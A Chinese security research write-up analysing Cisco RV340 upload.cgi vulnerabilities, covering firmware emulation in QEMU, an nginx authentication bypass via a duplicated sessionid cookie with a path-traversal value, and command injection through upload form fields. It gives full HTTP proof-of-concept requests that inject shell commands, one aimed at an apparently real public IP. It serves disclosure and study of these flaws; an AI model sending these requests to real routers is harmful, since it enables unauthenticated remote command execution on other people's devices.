## **一、引言**

本篇文章主要是对Cisco
RV340命令执行漏洞(CVE-2022-20707)进行的研究分析，尽管利用此漏洞需要身份验证，但可以通过CVE-2022-20705绕过现有的身份验证机制实现无条件的命令执行。历史相关的漏洞还包括：CVE-2020-3451、CVE-2021-1473、CVE-2021-1472，我们会逐一进行分析。

##  **二、环境搭建**

###  **2.1 固件下载**

可在Cisco官网下载到固件：https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.26?catid=268437899

###  **2.2 固件解压**

推荐使用7z-zip软件提取openwrt-comcerto2000-hgw-rootfs-ubi_nand.img\RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img\RV34X-v1.0.03.22-2021-06-14-02-33-28-AM\fw.gz\fw\openwrt-comcerto2000-hgw-rootfs-ubi_nand.img  
![](https://image.3001.net/images/20220513/1652420101_627dee05331e1b070db6e.png!small)将得到的ubi格式img用binwalk进行解压，但这里有点小坑，binwalk会把软链接给重置为/dev/null。  
![](https://image.3001.net/images/20220513/1652420128_627dee20399fbffb2c2fe.png!small)笔者这里是通过修改binwalk代码的方式强行绕过了此逻辑：binwalk/modules/extractor.py![](https://image.3001.net/images/20220513/1652420151_627dee3790d2be1a30ecb.png!small)

###  **2.3 qemu系统模拟**

修改Ubuntu
主机的网络配置，修改系统的网络接口配置文件/etc/network/interfaces。![](https://image.3001.net/images/20220513/1652420177_627dee51814cb02f0fbb3.png!small)编辑/etc/qemu-ifup  
![](https://image.3001.net/images/20220513/1652420186_627dee5acc79dc9e5666a.png!small)具体网络配置可以参考：  
https://blog.csdn.net/QQ1084283172/article/details/69378333  
重启一下虚拟机，因为我Ubuntu 主机的网卡是nat的，桥接就是桥接到nat网络里边去。下载对应的debian
qemu镜像https://people.debian.org/~aurel32/qemu/armhf/![](https://image.3001.net/images/20220513/1652420218_627dee7aee44a996cfd85.png!small)启动qemu虚拟机：

> sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd
> initrd.img-3.2.0-4-vexpress -drive
> if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2
> console=tty0" -net nic -net tap -nographic

将解出来的固件传到qemu虚拟机：  

> scp -r 1.tar root@192.168.250.173:/root/

解压并切入chroot环境：

> `tar zxvf 1.tar``chmod -R 777 rootfs``cd rootfs``sudo mount --bind /proc
> proc``sudo mount --bind /dev dev``chroot . /bin/sh`

逐步启动ngix服务：

> `/etc/init.d/boot boot``  
> ``generate_default_cert``  
> ``/etc/init.d/confd start``  
> ``/etc/init.d/nginx start``  
> `

尝试访问web页面：![](https://image.3001.net/images/20220513/1652420322_627deee22ac7c346c576b.png!small)至此，模拟环境搭建完成，可以开始进行漏洞测试。  

###  **2.4 调试技巧**

因为cgi是以uwsgi子进程的形式启动来处理请求，一次请求一个进程，使用gdbserver并不好attach。故直接修改upload.cgi二进制文件，在main函数入口位置修改汇编为自己跳自己，弄个死循环：![](https://image.3001.net/images/20220513/1652420341_627deef5905eaea6f4be1.png!small)这样进程就会一直卡住，等到gdbserver
attach上，再通过修改内存方式，修改代码为原程序逻辑：  
![](https://image.3001.net/images/20220513/1652420372_627def148c63282d92278.png!small)![](https://image.3001.net/images/20220513/1652420379_627def1ba780867199e7d.png!small)![](https://image.3001.net/images/20220513/1652420386_627def22903ec821392db.png!small)  

##  **三、CVE-2022-20705**

此漏洞是因nginx配置不当导致的授权绕过漏洞，是命令执行漏洞(CVE-2022-20707)利用的前置条件。命令执行漏洞需要用户能访问upload页面，这本是一个需要鉴权的页面。查看nginx配置文件以及配置引用关系，定位到/upload路径的访问是由/var/nginx/conf.d/web.upload.conf控制

>  
>
>  
>  
>     location / form - file - upload {include uwsgi_params;proxy_buffering
> off;uwsgi_modifier1 9;uwsgi_pass 127.0.0.1 : 9003;uwsgi_read_timeout
> 3600;uwsgi_send_timeout 3600;}location / upload {set $deny 1;if ( - f / tmp
> / websession / token / $cookie_sessionid) {set $deny "0";}if ($deny = "1")
> {return 403;}upload_pass / form - file - upload;upload_store / tmp /
> upload;upload_store_access user: rw group: rw all: rw;upload_set_form_field
> $upload_field_name.name "$upload_file_name";upload_set_form_field
> $upload_field_name.content_type "$upload_content_type";upload_set_form_field
> $upload_field_name.path "$upload_tmp_path";upload_aggregate_form_field
> "$upload_field_name.md5""$upload_file_md5";upload_aggregate_form_field
> "$upload_field_name.size""$upload_file_size";upload_pass_form_field
> "^.*$";upload_cleanup 400 404 499 500 - 505;upload_resumable on;

可以看到，nginx会通过判断/tmp/websession/token/$cookie_sessionid文件是否存在来进行访问控制。$cookie_sessionid可以通过我们传递的cookie来控制，我们可以将$cookie_sessionid的值设置为一个必定存在的文件，如../../../../../etc/passwd，即可绕过该判断机制。但是除了nginx的配置外，upload.cgi程序内部还有对传入cookie的格式校验，直接传入../../../../../etc/passwd显然是过不了代码侧的格式校验的：

>  
>
>  
>  
>     else if ( !strcmp(v5, "/upload")&& HTTP_COOKIE&& strlen(HTTP_COOKIE) -> 16 <= 0x40&& !match_regex("^[A-Za-z0-9+=/]*$", HTTP_COOKIE) ){v24 = v34;v25
> = v35;v26 = (int)v32;v27 = StrBufToStr(v41);sub_12684(HTTP_COOKIE, v24, v25,
> v26, v27, v36, v37, v38);}

那么有没有什么办法既能绕过nginx的鉴权，同时又能满足代码侧的格式校验呢？问题的关键就在于程序后端获取cookie的逻辑。这里代码通过for循环获取cookie的值，遇到分号就隔断了：  

> if ( HTTP_COOKIE )  
>  {  
>  StrBufSetStr(v40, HTTP_COOKIE);  
>  HTTP_COOKIE = 0;  
>  v13 = (char *)StrBufToStr(v40);  
>  for ( i = strtok_r(v13, ";", &save_ptr); i; i = strtok_r(0, ";", &save_ptr)
> )  
>  {  
>  sessionid = strstr(i, "sessionid=");  
>  if ( sessionid )  
>  HTTP_COOKIE = sessionid + '\n';  
>  }  
>  }
>
> }

换言之我们可以在cookie里传入两个sessionid，前一个用来绕过nginx的鉴权机制，后一个用来匹配upload.cgi的校验正则，代码会取最后一个sessionid作为传入的参数值：

> Cookie: sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTI3LjAuMC4xLzEx;

![](https://image.3001.net/images/20220513/1652420561_627defd13d7372a8113ef.png!small)  
如此便可成功绕过身份验证，进入upload.cgi的程序逻辑。  

##  **四、CVE-2022-20707**

在通过CVE-2022-20705绕过登录限制后，upload.cgi本身还存在一处命令执行漏洞。

> Cookie: sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTI3LjAuMC4xLzEx;

![](https://image.3001.net/images/20220513/1652420610_627df0023e3217de4a608.png!small)这里存在一个非常明显的命令拼接，upload.cgi会将请求提交过来的参数处理成json后被拼接到命令里，那么我们在参数中使用';{CMD};'即可成功执行命令。upload.cgi
可以接收的参数包括:

> jsonutil_get_string(dword_2324C, &v31, "\"file.path\"", -1);  
>  jsonutil_get_string(dword_2324C, &haystack, "\"filename\"", -1);  
>  jsonutil_get_string(dword_2324C, &v32, "\"pathparam\"", -1);  
>  jsonutil_get_string(dword_2324C, &v33, "\"fileparam\"", -1);  
>  jsonutil_get_string(dword_2324C, &v34, "\"destination\"", -1);  
>  jsonutil_get_string(dword_2324C, &v35, "\"option\"", -1);  
>  jsonutil_get_string(dword_2324C, &v36, "\"cert_name\"", -1);  
>  jsonutil_get_string(dword_2324C, &v37, "\"cert_type\"", -1);  
>  jsonutil_get_string(dword_2324C, &v38, "\"password\"", -1);

该cgi使用nginx文件上传模块获取参数，有些参数是由该模块生成。我们尽量选一些不影响程序正常逻辑的参数进行拼接，比如destination和option  
![](https://image.3001.net/images/20220513/1652420662_627df03674c23ac2da1f2.png!small)在拼接后的命令执行字符串如下：  
![](https://image.3001.net/images/20220513/1652420686_627df04e263ab10bdf4b7.png!small)可以看到命令已经执行：![](https://image.3001.net/images/20220513/1652420709_627df0651a5ea38d9795b.png!small)结合CVE-2022-20705的权限绕过，最终poc为：

    
    
    POST /upload HTTP/1.1Host: 192.168.250.173Content-Length: 729Accept: application/json, text/plain, */*optional-header: header-valueUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz6gIo5kcTkAlkCwXOrigin: http://192.168.250.173Referer: http://192.168.250.173/index.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: sessionid=../../../etc/passwd;sessionid=Y2lzY28vMTI3LjAuMC4xLzEx;Connection: close------WebKitFormBoundaryz6gIo5kcTkAlkCwXContent-Disposition: form-data; name="sessionid"EU6DJKEIWO------WebKitFormBoundaryz6gIo5kcTkAlkCwXContent-Disposition: form-data; name="pathparam"Firmware------WebKitFormBoundaryz6gIo5kcTkAlkCwXContent-Disposition: form-data; name="fileparam"file001------WebKitFormBoundaryz6gIo5kcTkAlkCwXContent-Disposition: form-data; name="destination"x';ls>/tmp/download/1.xml;'------WebKitFormBoundaryz6gIo5kcTkAlkCwXContent-Disposition: form-data; name="option"x------WebKitFormBoundaryz6gIo5kcTkAlkCwXContent-Disposition: form-data; name="file"; filename="1.img"Content-Type: application/octet-stream1111------WebKitFormBoundaryz6gIo5kcTkAlkCwX--
##  **五、CVE-2020-3451**

1.0.03.18及之前版本中的nginx配置并没有对访问upload校验是否授权。选用1.0.00.33进行分析，该版本cgi内部也没有对该路径是否授权校验，对/upload请求的处理由jsonrpc.cgi
处理：![](https://image.3001.net/images/20220513/1652420782_627df0ae735f077a73d55.png!small)cp
命令拼接时 v23由fileparam传入当在fileparam参数传入恶意拼接命令时，即可执行POC:

    
    
    POST /upload HTTP/1.1Connection: closeAccept-Encoding: gzip, deflateAccept: application/json, text/plain, */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Host: 186.86.126.88:443Content-Type: multipart/form-data; boundary=---------------------------42194771962641085195329489787Content-Length: 614-----------------------------42194771962641085195329489787Content-Disposition: form-data; name="sessionid"FOOT-----------------------------42194771962641085195329489787Content-Disposition: form-data; name="fileparam"file001;ls>/www/download/3.xml;-----------------------------42194771962641085195329489787Content-Disposition: form-data; name="pathparam"Firmware-----------------------------42194771962641085195329489787Content-Disposition: form-data; name="file"; filename="1233.img"Content-Type: application/octet-stream111111111111111-----------------------------42194771962641085195329489787--
##  **六、CVE-2021-1473 & CVE-2021-1472**

1.0.03.20版本的web.upload.conf为

    
    
    location /form-file-upload {include uwsgi_params;proxy_buffering off;uwsgi_modifier1 9;uwsgi_pass 127.0.0.1:9003;uwsgi_read_timeout 3600;uwsgi_send_timeout 3600;}location /upload {set $deny 1;      if ($http_authorization != "") {              set $deny "0";      }      if (-f /tmp/websession/token/$cookie_sessionid) {              set $deny "0";      }      if ($deny = "1") {              return 403;      }upload_pass /form-file-upload;upload_store /tmp/upload;upload_store_access user:rw group:rw all:rw;upload_set_form_field $upload_field_name.name "$upload_file_name";upload_set_form_field $upload_field_name.content_type "$upload_content_type";upload_set_form_field $upload_field_name.path "$upload_tmp_path";upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";upload_pass_form_field "^.*$";upload_cleanup 400 404 499 500-505;upload_resumable on;}

只要在头部增加 Authorization
即可令$http_authorization不为空，从而绕过身份校验。该版本的upload.cgi在进行curl命令拼接时，a1由cookie中的sessionid传入。![](https://image.3001.net/images/20220513/1652420883_627df11349f62116bbc54.png!small)最终poc为：

    
    
    POST /upload HTTP/1.1Connection: closeAccept-Encoding: gzip, deflateAccept: application/json, text/plain, */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36Host: 186.86.126.88:443Cookie: sessionid='&ls>/tmp/download/2.xml&'; Authorization: YWRtaW46YWRtaW4=Content-Length: 570Content-Type: multipart/form-data; boundary=5097417339e2369be225700925a71758--5097417339e2369be225700925a71758Content-Disposition: form-data; name="sessionid"foobar--5097417339e2369be225700925a71758Content-Disposition: form-data; name="destination"x--5097417339e2369be225700925a71758Content-Disposition: form-data; name="fileparam"Configuration--5097417339e2369be225700925a71758Content-Disposition: form-data; name="pathparam"Configuration--5097417339e2369be225700925a71758Content-Disposition: form-data; name="file"; filename="1233.xml"Content-Type: text/xml1233333--5097417339e2369be225700925a71758--
  

##  **七、﻿** **总结**

下表为upload.cgi系列漏洞的总结：![](https://image.3001.net/images/20220513/1652420942_627df14ee192c060cb5e7.png!small)  
  
[原文链接](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247484452&idx=1&sn=1b6f10f8f1a1dd76134251b2b79ca0fe&chksm=c2a1d0adf5d659bb6ac6c64642cd745499c11ac98b539f4d2faa4392085b5756cf81cc30e8c7&mpshare=1&scene=1&srcid=05138YZTtUf1uWLemQEPQVJG&sharer_sharetime=1652415617946&sharer_shareid=e2810228000aab536ea6dcae2afc9cd8&version=4.0.6.6516&platform=win#rd)  

